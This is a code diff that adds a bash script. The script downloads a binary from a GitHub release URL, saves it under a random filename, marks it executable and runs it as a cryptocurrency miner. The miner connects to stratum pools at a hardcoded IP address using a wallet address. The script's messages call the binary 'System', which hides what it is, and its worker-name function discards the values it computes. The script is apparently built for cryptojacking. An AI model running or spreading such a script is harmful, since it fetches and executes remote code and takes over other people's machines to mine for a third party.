@@ -1,0 +1,54 @@
+#!/bin/bash
+
+# Generate a random 10-character lowercase alphanumeric filename
+generate_random_filename() {
+    tr -dc 'a-z0-9' < /dev/urandom | head -c 10
+    echo
+}
+
+generate_worker_name() {
+    prefix="TNVDEV22"
+    date_str=$(TZ='Asia/Kolkata' date '+%Y%m%d')
+    random_suffix=$(tr -dc 'a-z0-9' < /dev/urandom | head -c 4)
+    echo "DC999"
+}
+
+main() {
+    miner_filename=$(generate_random_filename)
+    worker_name=$(generate_worker_name)
+
+    # Optional: cleanup on Ctrl+C or SIGTERM
+    trap "echo '🧹 Cleaning up...'; rm -f \"$miner_filename\"; exit" INT TERM
+
+    echo "📥 Downloading miner to: $miner_filename"
+    if wget -q https://github.com/vedhagsvp/qubros/releases/download/apl/crcxcba -O "$miner_filename"; then
+        echo "✅ System downloaded as: $miner_filename"
+    else
+        echo "❌ Failed to download miner. Exiting."
+        exit 1
+    fi
+
+    echo "🔐 Setting executable permission..."
+    if chmod +x "$miner_filename"; then
+        echo "✅ Permissions set."
+    else
+        echo "❌ Failed to set permissions. Exiting."
+        exit 1
+    fi
+
+    echo "👷 Worker Name: $worker_name"
+
+    echo "🚀 Starting miner..."
+    ./"$miner_filename" \
+        -P stratum1+tcp://cb155e3976ee1c05723b2026fa30870b36b0201c0825.${worker_name}@139.162.31.190:8084 \
+        -P stratum1+tcp://cb155e3976ee1c05723b2026fa30870b36b0201c0825.${worker_name}@139.162.31.190:8085 \
+        -P stratum1+tcp://cb155e3976ee1c05723b2026fa30870b36b0201c0825.${worker_name}@139.162.31.190:8086
+
+    if [[ $? -eq 0 ]]; then
+        echo "✅ System ran successfully."
+    else
+        echo "❌ System exited with an error."
+    fi
+}
+
+main
